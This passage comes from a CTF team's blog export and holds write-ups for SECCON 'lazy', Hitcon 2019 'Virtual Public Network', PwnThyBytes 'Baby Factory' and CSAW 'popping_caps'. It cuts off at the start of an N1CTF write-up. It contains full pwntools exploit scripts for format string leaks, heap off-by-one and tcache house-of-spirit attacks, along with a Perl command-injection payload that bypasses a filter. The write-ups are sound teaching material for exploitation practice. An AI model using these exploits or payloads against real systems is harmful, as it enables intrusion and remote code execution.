0x%x\"%CANARY) leakFMTSi(1) r.recvuntil('Filename : ') STACKADDR = int(r.recv(0x10),16) STACKADDR += 0x900 # prevent a stupid printf error log.info(\"STACKADDR 0x%x\"%STACKADDR) if os.path.isfile(\"libc.so.6\"): exploit() r.interactive() r.close() break else: overflow() r.sendline(p64(0x03)+'\\x00') r.recvuntil(' bytes') a = r.recvall() #print len(a) if '2: Login' in a or len(a) == 0: i -= 1 else: with open('libc.so.6','a+') as f: f.write(a) continue Running it 12345678910111213141516171819202122232425262728293031323334353637383940414243444546$ python lazy.py REMOTE[*] '/ctf/work/pwn/lazy/lazy' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done[*] PUTS 0x7f52ab072880[*] LIBC 0x7f52ab00b000[*] LIBC 0x7f52ab04a570[*] LIBC 0x7f52ab16ec38 0\\x1f`OK! Downloading...[*] CANARY 0x76eb2783e56af300[*] STACKADDR 0x7ffead1298c0[+] Receiving all data: Done (3.49MB)[*] Closed connection to lazy.chal.seccon.jp port 33333[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done[*] PUTS 0x7fb92abf5880[*] LIBC 0x7fb92ab8e000[*] LIBC 0x7fb92abcd570[*] LIBC 0x7fb92acf1c38 0\\x1f`OK! Downloading...[*] CANARY 0x2af46916b0743600[*] STACKADDR 0x7fff8cfe3ed0[*] Switching to interactive modeWelcome to private directoryYou can download contents in this directory, but you can't download contents with a dot in the namelazylibc.so.6Input file nameFilename : libcOK! Downloading..../libNo such file!$ ls810a0afb2c69f8864ee65f0bdca999d7_FLAGcatlazyld.solibc.so.6qrun.sh$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAGSECCON&#123;Keep_Going!_KEEP_GOING!_K33P_G01NG!&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"seccon2019","slug":"seccon2019","permalink":"https://teamrocketist.github.io/tags/seccon2019/"}]},{"title":"[Web] Hitcon 2019 - Virtual Public Network","slug":"Web-Hitcon-2019-Virtual-Public-Network","date":"2019-10-14T15:18:51.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/","link":"","permalink":"https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/","excerpt":"","text":"Virtual Public Network [183pts] Vulnerable Point of Your Network :) http://13.231.137.9 Author: 🍊Orange 81 Teams solved. We have have a web interface where we can control tcpdump command via options parameter this immediately hints for a command injection challenge, after inspecting the code we could see some hints in a html comment: 12345678910111213 &lt;div class='container'&gt; &lt;br&gt; &lt;br&gt; &lt;div class='row justify-content-center'&gt; &lt;h1&gt;&lt;font style=\"font-size: 200%\"&gt; Virtual &lt;b&gt;&lt;font color=red&gt;\"Public\"&lt;/font&gt;&lt;/b&gt; Network &lt;/font&gt;&lt;/h1&gt; &lt;/div&gt;&lt;!-- Hint for you :) &lt;a href='diag.cgi'&gt;diag.cgi&lt;/a&gt; &lt;a href='DSSafe.pm'&gt;DSSafe.pm&lt;/a&gt; --&gt; &lt;br&gt; &lt;br&gt; &lt;div class='row justify-content-center'&gt; Cgi scripts outside cgi-bin folder won’t execute instead we will be able to view its source code so lets inspect diag.cgi first: 1234567891011121314151617181920212223242526#!/usr/bin/perluse lib '/var/www/html/';use strict;use CGI ();use DSSafe;sub tcpdump_options_syntax_check &#123; my $options = shift; return $options if system(\"timeout -s 9 2 /usr/bin/tcpdump -d $options &gt;/dev/null 2&gt;&amp;1\") == 0; return undef;&#125; print \"Content-type: text/html\\n\\n\"; my $options = CGI::param(\"options\");my $output = tcpdump_options_syntax_check($options); # backdoor :)my $tpl = CGI::param(\"tpl\");if (length $tpl &gt; 0 &amp;&amp; index($tpl, \"..\") == -1) &#123; $tpl = \"./tmp/\" . $tpl . \".thtml\"; require($tpl);&#125; This would be a very easy challenge if it wasn’t for use DSSafe; after some search online I ended up at the challenge author blog as he said this is a module to hook all dangerous Perl invocations like system, open, backtick etc… This module is called it’s source code at http://13.231.137.9/DSSafe.pm: The full source code can be found at https://pastebin.com/EyY7UWAX This module replaces the original system and implements its own command line parser which blocks some bad characters like: 1[\\&amp;\\*\\(\\)\\&#123;\\&#125;\\[\\]\\`\\;\\|\\?\\n~&lt;&gt;] So the idea behind to bypass this restritions is to run perl script via strerr by using tcpdump ‘-r’ option, this option tries to read a file and this is what happens when we try to read a file that doesn’t exist with tcpdump: 12$ tcpdump -d -r 123tcpdump: 123: No such file or directory As you can see we can control the file name (123) so we can use the name to inject our perl code, but we have two aditional parts to consider so we don’t get errors while running it this error message. The first one is the tcpdump: part luckly in perl this will interpreted as a goto jump label this is something that you can do also in c or on assembly(labels where we can jump to) we won’t have any compilation problems with this so lets move on. The second one is : No such file or directory this won’t compile unless we remove by using a comment just like we do when we are performing sql injection, so lets test if this works in the command line: 12$ tcpdump -d -r 'print 123#' 2&gt;&amp;1 | perl -123 As you can see it works here is a visual image from orange blog how the perl script looks like in a highlighter: We can’t really control stdout in the application so we need to redirect the stderr into a file and use the backdoor present here: 123456# backdoor :)my $tpl = CGI::param(\"tpl\");if (length $tpl &gt; 0 &amp;&amp; index($tpl, \"..\") == -1) &#123; $tpl = \"./tmp/\" . $tpl . \".thtml\"; require($tpl);&#125; So if we send our payload to a file at ./tmp and pass the file name to tpl get parameter, require will execute as perl and we get RCE. Our final payload will require a &lt; in the end to fool DSSAFE.pm and redirect STDERR into a folder that we can write and read, this folder is ./tmp : 1-r$x=\"ls /\",exec$x# 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw And now url encoding the string: 1-r$x=\"ls%20/\",exec$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw Adding some backslashes to dolar sign so the variable isn’t evaluated as a bash variable: 1-r\\$x=\"ls%20/\",exec\\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw Using curl to test our payload: 12345678910111213141516171819202122232425262728$ curl \"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\\$x=\\\"ls%20/\\\",exec\\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw\"$READ_FLAG$FLAGbinbootdevetchomeinitrd.imginitrd.img.oldliblib64lost+foundmediamntoptprocrootrunsbinsnapsrvsystmpusrvarvmlinuzvmlinuz.old And it worked we managed to run ls, but we now see $READ_FLAG$ which is an executable and the file FLAG containing the flag , we don’t rights to read directly only root can, our user is www-data, but if we manage to run the executable $READ_FLAG$ (setuid bit is enabled so it will run as root which is the file owner). I run into some problems because of the file name there is some shitty symbols($) so we need to do some tricks to be able to execute: Backslash with \\x5c dolar signs so they won’t be interpreted as a bash variable. Write dolar signs as \\x24 so they won’t be interpreted as a perl variable in a double quoted string. Use sh -c ‘executable’ to execute the binary. The final payload without url encoding looks like this: 1-r\\$x=\\\"sh -c '/\\x5c\\x24READ_FLAG\\x5c\\x24'\",exec\\$x# 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw With url encoding: 1-r\\$x=\\\"sh%20-c%20'/\\x5c\\x24READ_FLAG\\x5c\\x24'\\\",exec\\$x%23%202&gt;./tmp/qw.thtml%20&amp;tpl=qw Running with curl:12$ curl \"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\\$x=\\\"sh%20-c%20'/\\x5c\\x24READ_FLAG\\x5c\\x24'\\\",exec\\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw\"hitcon&#123;Now I'm sure u saw my Bl4ck H4t p4p3r :P&#125; The flag was: References: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"perl","slug":"perl","permalink":"https://teamrocketist.github.io/tags/perl/"},{"name":"cgi","slug":"cgi","permalink":"https://teamrocketist.github.io/tags/cgi/"},{"name":"vpnssl","slug":"vpnssl","permalink":"https://teamrocketist.github.io/tags/vpnssl/"}]},{"title":"[Pwn] PwnThyBytes 2019 - Baby Factory","slug":"Pwn-PwnThyBytes-2019-Baby-Factory","date":"2019-09-30T11:48:53.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/","link":"","permalink":"https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/","excerpt":"","text":"Baby Factory100 Author: FedEx In order to keep the world perfectly balanced, as all things should be, we’ve designed a management system. Don’t forget, with great power comes great responsability! Prove yourself worthy. nc 137.117.216.128 13373 Download Another heap challenge, libc-2.23 is used so no tcache on this version . 12$ file babyfactorybabyfactory: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e40dbc48ecfd16e9c12a93c42520cf9f85e2671b, stripped With this we know: ELF compiled for x86_x64 architecture. Dynamically linked. Stripped (A little bit harder to reverse). As usual the next thing is to check the security of the binary1234567$ checksec babyfactory[*] '/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Brief analysis of these protections: FULL RELRO (GOT entries are read only we can’t overwrite them) STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it) The Stack is not executable (We can’t execute shellcode, techniques like ROP can bypass this) PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address) Testing the binaryThe binary comes with the usual options on a normal heap challenge, create, edit,lists and eliminate. Let’s start by doing static analysis on create and edit: Delete doesn’t have any kind of vulnerability so no double free or use after free possible, print will show every allocated object, create is limited to 7 mallocs because of variable at piebase+0x202024 this variable increases at each allocation and goes up to 7, after that no more allocations are allowed and the string “Too many, sorry” is shown. ExploitWe have some limitations on the allocation sizes we can only do 0x68,0x69 and 0x10, because of this all the chunks when freed will fall into fastbin range. We can use off by one vulnerability to overflow the size of a chunk to be able to get a greater sized chunk ultrapassing the fastbin range (0x81), this is useful to get a chunk into an unsorted bin to get a leak of a libc address. We can also use this to manage to get arbitrary write by changing the pointer of char* name to the address we want for example free_hook and update its value into system to get a shell. The memory layout on the heap will be a little weird because of the created struct, malloc(0x10) stores the pointers/values of objects of the struct xpto. Normally, when programming in c we do malloc(sizeof(struct xpto)), sizeof(struct xpto) is equal to 0x10 and why? char* pointer and long integer are “objects” of the struct, the memory needed to store this objects are 0x8 for the char* and 0x8 for the long int this makes 0x8+0x8=0x10. This the view of a struct object in memory:The plan is: Malloc “boy chunk” A,B and C and set day to -1(0xfffffffff). Edit will think A is a “girl chunk” we can use this to overflow the size of chunk B with 0x91. Free chunk B (To achieve success on freeing this a fake chunk needs to be created at chunk B(name)) chunk will be inserted into unsorted bin updating fd and bk with libc addresses. Next malloc will be placed right above of the freed chunk(chunk_overlap). Leak libc with print. Overflow again the size of 0x21 but this time to 0x71 by editing chunk A again. Freeing chunk B will put this into a fastbin. Use next boy allocation to update the new 0x21 chunk to 0x71 to prevent errors from security check for the next malloc. Next allocated “boy chunk” will be placed right at the char* name pointer of chunk B, modify it with free_hook pointer. By editing chunk B we will write into the char* name pointer which got modified previously by us into free_hook set it into system. Edit chunk A data into ‘/bin/sh\\x00’ Free chunk A to Trigger free_hook and get a shell. Off by OneLets start by allocate 3 chunks with 123add(1,'A'*0x8, 0xffffffff) # 0add(1,'B'*0x8, 0xffffffff) # 1add(1,\"C\"*0x8, 0xffffffff) # 2 Now we want to overwrite chunk B(0x21) size to 0x91 this way we can make this chunk into unsortedbin range: 1edit(0x0, '\\x91'*0x69) Lets see what happens when we free this chunk: 1free(1) Now lets malloc1add(1,'\\xb0', 0xffffffff) # 1 Now we can get libc address from index 1: 123456789list()r.recvuntil('[1] GIRL= ')addr = u64(r.recv(6).ljust(0x8,'\\x00'))LIBC = addr-0x3c4bb0FREE_HOOK = LIBC+libc.symbols['__free_hook']SYSTEM = LIBC+libc.symbols['system']log.info(\"LEAKED 0x%x\", addr)log.info(\"LIBC 0x%x\", LIBC)log.info(\"FREE_HOOK 0x%x\", FREE_HOOK) Now it’s time to overflow chunk B again but this time to 0x71 and free it: 12edit(0x0, '\\x71'*0x69)free(1) This is what happens if we don’t create that fake chunk at that location: 12345678910111213141516171819$ root@ptb:/ctf/work/pwn/babyfactory# python babyfactory.py[*] '/ctf/work/pwn/babyfactory/babyfactory' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/lib/x86_64-linux-gnu/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Starting local process './babyfactory': pid 8668[*] LEAKED 0x7f0f80e67bb0[*] LIBC 0x7f0f80aa3000[*] FREE_HOOK 0x7f0f80e697a8[*] Switching to interactive mode*** Error in `./babyfactory': free(): invalid next size (fast): 0x000055b286da70a0 *** Next size is zero making it an invalid size lets check the code in malloc.c:Lets fix this by adjusting in the beginning of our script: 123add(1,'A'*0x8, 0xffffffff) # 0add(1,p64(0)*9+p64(0x71), 0xffffffff) # 1add(1,\"C\"*0x8, 0xffffffff) # 2 separate the released chunk from the top chunk. Now free will work and we get this :Now next malloc: 1add(1, p64(0)+p64(0)+p64(0)+p64(0x71),0xffffffff) # 1 As explained in the picture above p64(0)+p64(0)+p64(0)+p64(0x71) to bypass this security check:Remember fastbin(0x70) is something like this right now: 10x70: 0x5620cb07a0b0 —▸ 0x5620cb07a0a0 ◂— 0x0 Remember before we exchanged the size to 0x91 the old size was 0x21 this means that this was place that stored the pointers of the structure which means if we modify the first field of this chunk we will change the pointer of char* name into free_hook next edit will write directly into free_hook giving us an arbitrary write free of security checks: 1add(1, p64(FREE_HOOK),0xffffffff) # 3 The look of the heap before the 1st pointer gets updated to free_hook:The look after update to free_hook occurs:Now setting free_hook into system putting “/bin/sh” into index 0 , by freeing index 0 we trigger free_hook and get a shell: 123edit(1, p64(SYSTEM))edit(0,\"/bin/sh\\x00\")free(0) The full exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *host, port = \"137.117.216.128\", \"13373\"filename = \"./babyfactory\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.23.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def add(obj, name, day): r.sendlineafter('[5] Abandon Baby\\n &gt; ','1') r.sendlineafter('[2] Girl \\n &gt; ',str(obj)) r.sendafter('Enter Name: ', name) r.sendlineafter('Enter Day: ', str(day))def edit(index, name): r.sendlineafter('[5] Abandon Baby\\n &gt; ','2') r.sendlineafter('Enter Baby IDX: ', str(index)) r.sendafter('Enter new name: ', name)def list(): r.sendlineafter('[5] Abandon Baby\\n &gt; ','3')def free(index): r.sendlineafter('[5] Abandon Baby\\n &gt; ','4') r.sendlineafter('Enter Baby IDX: ', str(index)) context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xc7b,0x1072]) # malloc 0xc7b malloc 0xc88 free 0x1072 edit 0xf92add(1,'A'*0x8, 0xffffffff) # 0add(1,p64(0)*9+p64(0x71), 0xffffffff) # 1add(1,\"C\"*0x8, 0xffffffff) # 2 separate the released chunk from the top chunk.edit(0x0, '\\x91'*0x69)free(1)add(1,'\\xb0', 0xffffffff) # 1list()r.recvuntil('[1] GIRL= ')addr = u64(r.recv(6).ljust(0x8,'\\x00'))LIBC = addr-0x3c4bb0FREE_HOOK = LIBC+libc.symbols['__free_hook']SYSTEM = LIBC+libc.symbols['system']log.info(\"LEAKED 0x%x\", addr)log.info(\"LIBC 0x%x\", LIBC)log.info(\"FREE_HOOK 0x%x\", FREE_HOOK)edit(0x0, '\\x71'*0x69)free(1)add(1, p64(0)+p64(0)+p64(0)+p64(0x71),0xffffffff) # 1add(1, p64(FREE_HOOK),0xffffffff) # 3edit(1, p64(SYSTEM))edit(0,\"/bin/sh\\x00\")free(0)r.interactive()r.close() Running it:1234567891011121314151617181920$ python babyfactory.py REMOTE[*] '/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/pwnthybytes2019/pwn/babyfactory/libc-2.23.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 137.117.216.128 on port 13373: Done[*] LEAKED 0x7fec914ecbb0[*] LIBC 0x7fec91128000[*] FREE_HOOK 0x7fec914ee7a8[*] Switching to interactive mode$ cat home/babyfactory/flagPTBCTF&#123;d516da8f4726509484aa98eabd8e095f&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Off By One","slug":"Pwn/x64/Glibc-Malloc/Off-By-One","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"off_by_one","slug":"off-by-one","permalink":"https://teamrocketist.github.io/tags/off-by-one/"},{"name":"pwnthybytes2019","slug":"pwnthybytes2019","permalink":"https://teamrocketist.github.io/tags/pwnthybytes2019/"}]},{"title":"[Pwn] csaw 2019 - popping_caps","slug":"Pwn-csaw-2019-popping-caps","date":"2019-09-16T00:59:30.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/09/16/Pwn-csaw-2019-popping-caps/","link":"","permalink":"https://teamrocketist.github.io/2019/09/16/Pwn-csaw-2019-popping-caps/","excerpt":"","text":"popping_caps Description:350 You ever wonder why cowboys have 7-shooters and not an even number? nc pwn.chal.csaw.io 1001popping_capslibc.so.6 Analysing the binary1234567$ checksec popping_caps[*] '/ctf/work/pwn/popping_caps/popping_caps' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 12$ file popping_capspopping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=0b94b47318011a2516372524e7aaa0caeda06c79, not stripped Running and testing the binary: 12345678$ ./popping_caps Here is system 0x7f9bcaead440You have 7 caps![1] Malloc[2] Free[3] Write[4] ByeYour choice: We can see from the beginning we already have libc leaked! So we don’t even need to worry about that besides that we have 4 options we can malloc, free, write and exit. Finding the vulnerabilityFree LibcMain FunctionBye Function Exploit planWe can only do 7 actions which is pretty low luckily libc is already leaked so we don’t need to waste any actions on doing that. Libc version is 2.27 we know that tcache is being used we also know from our analysis above use after free is not directly possible so we can already discard tcache poisoning. We can use tcache dup which involves double freeing, during the ctf I tried to use this technique but I quickly realized that it used way too many actions so I also discarded this. We can free on any place in the heap so we can use tcache house of spirit we also need to create a fake chunk in the place we want to write due to security checks. Using house of spirit to corrupt tcache_perthread_structs entries is the way to go. So the exploit plan is: Malloc with size of 0x3a8. free it to increase the counter of that tcachebin(0x100) to 1 creating a fake chunk of size 0x100. Free this fake chunk by using the negative index of -0x210 (House of spirit). Malloc with size of 0xf8 will return the pointer at the first tcache entry (size 0x20). Edit the first entry with the pointer of malloc_hook. Malloc with size of 0x20 the pointer returned will be malloc_hook. Edit malloc_hook with one_gadget. tcache_perthread_structThe tcache_perthread_struct is allocated via _int_malloc, so it resides on the heap. The counts member is mostly uninteresting but corrupting the entries array makes it possible to do what tcache poisoning does but in less steps. The tcache_pthread_struct is the body of a single tcache thread and consists of two arrays. Among them, the data entries represents the tcache linked list, a total of TCACHE_MAX_BINS (default is 64), the counts array represents the number of memory blocks in each single linked list. The data structure is very similar to a fastbin1234567891011121314151617181920/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread bool tcache_shutting_down = false;static __thread tcache_perthread_struct *tcache = NULL; Constant definition: As can be seen from the constants, in the default configuration, the maximum number of singly linked lists in the structure is 64, and there are up to 7 memory blocks in each singly linked list. The maximum memory block size that can be accommodated is 0x408 (1032 in decimal). 1234567891011121314151617181920212223#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When \"x\" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When \"x\" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7#endif Debugging with GDBIf we want to corrupt the tcache_perthread_struct we need to know where it is located in the heap, pwndbg already gives us cool commands like tcache, tcachebins that show us the linked lists in a pretty way but we kind need to view it in a hexdump view so we can start planing on how to corrupt. The heap will only initiate at the first allocation so lets allocate and see what happens:So lets look how tcache struct looks like in a hexdump, if we use p tcache command in gdb it doesn’t work: 123pwndbg&gt; p tcacheCannot find thread-local storage for process 7678, shared library /lib/x86_64-linux-gnu/libc.so.6:Cannot find thread-local variables on this target We need to do it like this: 12345pwndbg&gt; p *(struct tcache_perthread_struct *)0x55f21c0fd000$1 = &#123; counts = &quot;\\000\\000\\000\\000\\000\\000\\000\\000Q\\002&quot;, &apos;\\000&apos; &lt;repeats 53 times&gt;, entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;&#125; Showing it as hex dump: 123456789101112131415161718192021pwndbg&gt; x/40gx 0x55f21c0fd0000x55f21c0fd000: 0x0000000000000000 0x00000000000002510x55f21c0fd010: 0x0000000000000000 0x00000000000000000x55f21c0fd020: 0x0000000000000000 0x00000000000000000x55f21c0fd030: 0x0000000000000000 0x00000000000000000x55f21c0fd040: 0x0000000000000000 0x00000000000000000x55f21c0fd050: 0x0000000000000000 0x00000000000000000x55f21c0fd060: 0x0000000000000000 0x00000000000000000x55f21c0fd070: 0x0000000000000000 0x00000000000000000x55f21c0fd080: 0x0000000000000000 0x00000000000000000x55f21c0fd090: 0x0000000000000000 0x00000000000000000x55f21c0fd0a0: 0x0000000000000000 0x00000000000000000x55f21c0fd0b0: 0x0000000000000000 0x00000000000000000x55f21c0fd0c0: 0x0000000000000000 0x00000000000000000x55f21c0fd0d0: 0x0000000000000000 0x00000000000000000x55f21c0fd0e0: 0x0000000000000000 0x00000000000000000x55f21c0fd0f0: 0x0000000000000000 0x00000000000000000x55f21c0fd100: 0x0000000000000000 0x00000000000000000x55f21c0fd110: 0x0000000000000000 0x00000000000000000x55f21c0fd120: 0x0000000000000000 0x00000000000000000x55f21c0fd130: 0x0000000000000000 0x0000000000000000 Now explaining each field of the struct and why we should malloc(0x3a8) to create a fake chunk: This is what house of spirit is about, freeing a fake chunk which will be inserted into the tcachebin of that range, next malloc will be written in the position we want write. To calculate the offset to free we can simply do some math:This is how it looks after freeing the fake chunk:Next malloc(0xf8):Edit with malloc_hook edit(p64(MALLOC_HOOK)):Malloc(0x18) because the pointer is in the tcachebin(0x20):Malloc returns malloc_hook:Finally edit(p64(one_gadget)):The final malloc at bye will trigger the hook and we get a shell:12345678910111213141516171819202122232425$ python popping_caps.py REMOTE[*] '/ctf/work/pwn/popping_caps/popping_caps' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/popping_caps/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to pwn.chal.csaw.io on port 1001: Done[*] SYSTEM 0x7f99382e1440[*] LIBC 0x7f9938292000[*] one_gadget 0x7f993839c38c[*] MALLOC_HOOK 0x7f993867dc30[*] Switching to interactive modeBANG!Bye!$ lsflag.txtpopping_caps$ cat flag.txtflag&#123;1tsh1ghn000000000n&#125; The full exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *host, port = \"pwn.chal.csaw.io\", \"1001\" filename = \"./popping_caps\"elf = ELF(filename)context.arch = 'amd64' if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc.so.6')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def add(size): r.sendlineafter('Your choice: \\n', '1') r.sendlineafter('How many: \\n', str(size))def free(index): r.sendlineafter('Your choice: \\n', '2') r.sendlineafter('Whats in a free: \\n', str(index))def edit(content): r.sendlineafter('Your choice: \\n', '3') r.sendafter('Read me in: \\n', content) context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xbd0,0xc0e,0xa74]) # malloc 0xbd0 ; free 0xc0e r.recvuntil('Here is system ')SYSTEM = int(r.recvline().rstrip(),16)LIBC = SYSTEM - libc.symbols['system']MALLOC_HOOK = LIBC+libc.symbols['__malloc_hook']one_gadget = LIBC +0x10a38clog.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"LIBC 0x%x\"%LIBC)log.info(\"one_gadget 0x%x\"%one_gadget)log.info(\"MALLOC_HOOK 0x%x\"% MALLOC_HOOK)#context.log_level='debug'add(0x3a8)free(0)free(-0x210)add(0xf8)edit(p64(MALLOC_HOOK))add(0x10)edit(p64(one_gadget))r.interactive()r.close() #","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Tcache","slug":"Pwn/x64/Glibc-Malloc/Tcache","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"},{"name":"tcache_perthread_struct","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-perthread-struct","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-perthread-struct/"},{"name":"House of Spirit","slug":"Pwn/x64/Glibc-Malloc/Tcache/House-of-Spirit","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/House-of-Spirit/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"house_of_spirit","slug":"house-of-spirit","permalink":"https://teamrocketist.github.io/tags/house-of-spirit/"},{"name":"csaw2019","slug":"csaw2019","permalink":"https://teamrocketist.github.io/tags/csaw2019/"},{"name":"tcache_perthread_struct","slug":"tcache-perthread-struct","permalink":"https://teamrocketist.github.io/tags/tcache-perthread-struct/"}]},{"title":"[Pwn] N1CTF 2019 - warmup","slug":"Pwn-N1CTF-2019-warmup","date":"2019-09-09T00:51:13.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/09/09/Pwn-N1CTF-2019-warmup/","link":"","permalink":"https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/","excerpt":"","text":"warmup Description:192 Solvers 43 attachment：https://share.weiyun.com/5NiPNJA password：ryzwab or 